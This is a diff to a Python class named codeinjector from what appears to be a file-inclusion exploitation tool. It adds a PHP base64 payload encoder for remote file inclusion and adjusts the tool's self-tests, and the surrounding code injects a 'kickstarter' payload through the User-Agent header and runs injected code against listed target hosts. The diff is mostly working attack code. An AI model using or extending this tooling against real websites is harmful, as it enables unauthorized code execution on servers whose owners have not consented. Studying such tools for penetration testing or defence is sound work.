@@ -399,6 +399,10 @@ class codeinjector(baseClass):
                 if (postdata != ""):
                     p = "%s&%s" %(postdata, p)
                 code = self.doPostRequest(url, p)
+                
+                if (code == None):
+                    return(None)
+                
                 #TODO: Cleanup this dirty block :)
                 if (code.find(testcode[1]) == -1):
                     self._log("Kickstarter is not present. Injecting kickstarter thru UserAgent...", self.LOG_INFO)
@@ -473,10 +477,13 @@ class codeinjector(baseClass):
         for langName, langObj in langClass.items():
             print "Testing language %s..." %(langName)
             c, r = langObj.generateQuiz()
+            
+            enc_c = self.payload_encode(c)
+            
             if (settings["dynamic_rfi"]["mode"] == "local"):
                 print "Testing Local->RFI configuration..."
                 code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", "", c, {})
-                if (code == c):
+                if (code == enc_c):
                     print "Dynamic RFI works!"
                     for ext in langObj.getExtentions():
                         print "Testing %s interpreter..." %(ext)
@@ -495,13 +502,13 @@ class codeinjector(baseClass):
                 code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", "", c, {})
                 if (code != None):
                     code = code.strip()
-                    if (code == c):
+                    if (code == enc_c):
                         print "Dynamic RFI works!"
                         for ext in langObj.getExtentions():
                             print "Testing %s interpreter..."%(ext)
                             #settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ext
                             code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ext, "", ext, c, {})
-                            if (code == r):
+                            if (code.find(r) != -1):
                                 print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
                             else:
                                 pass # Seems to be not interpreted...
@@ -509,6 +516,7 @@ class codeinjector(baseClass):
     
                     else:
                         print "Failed! Something went wrong..."
+                        print "Code: " + code;
                 else:
                     print "Code == None. That's not good! Failed!"
             else:
@@ -579,6 +587,8 @@ class codeinjector(baseClass):
         
         
     def executeRFI(self, URL, postdata, appendix, content, header):
+        content = self.payload_encode(content)
+        
         if (appendix == "%00"): appendix = ""
         if settings["dynamic_rfi"]["mode"]=="ftp":
             up = self.FTPuploadFile(content, appendix)
@@ -594,7 +604,17 @@ class codeinjector(baseClass):
             self.deleteLocalPayload(up["local"])
             return(code)
             
-
+    
+    def payload_encode(self, content):
+        if (self.config["p_rfi_encode"] != None):
+            if (self.config["p_rfi_encode"] == "php_b64"):
+                content = "<?php echo base64_decode(\"%s\"); ?>"%(base64.b64encode(content))
+                self._log("Encoded content: %s" %(content), self.LOG_DEBUG)
+            else:
+                self._log("Invalid RFI encoder selected!", self.LOG_WARN);
+        
+        return(content)
+        
     
     def chooseDomains(self, OnlyExploitable=True):
         choose = {}
@@ -603,6 +623,7 @@ class codeinjector(baseClass):
         header = ":: List of Domains ::"
         textarr = []
         doRemoteWarn = False
+        missingCount = 0
         
         for n in nodes:
             host = n.getAttribute("hostname")
@@ -625,7 +646,10 @@ class codeinjector(baseClass):
                 else:
                     textarr.append("[%d] %s" %(idx, host))
                 idx = idx +1
-
+            else:
+                missingCount += 1
+    
+        textarr.append("[ ] And %d hosts with no valid attack vectors."%(missingCount))
         textarr.append("[q] Quit")
         self.drawBox(header, textarr)
         if (doRemoteWarn):
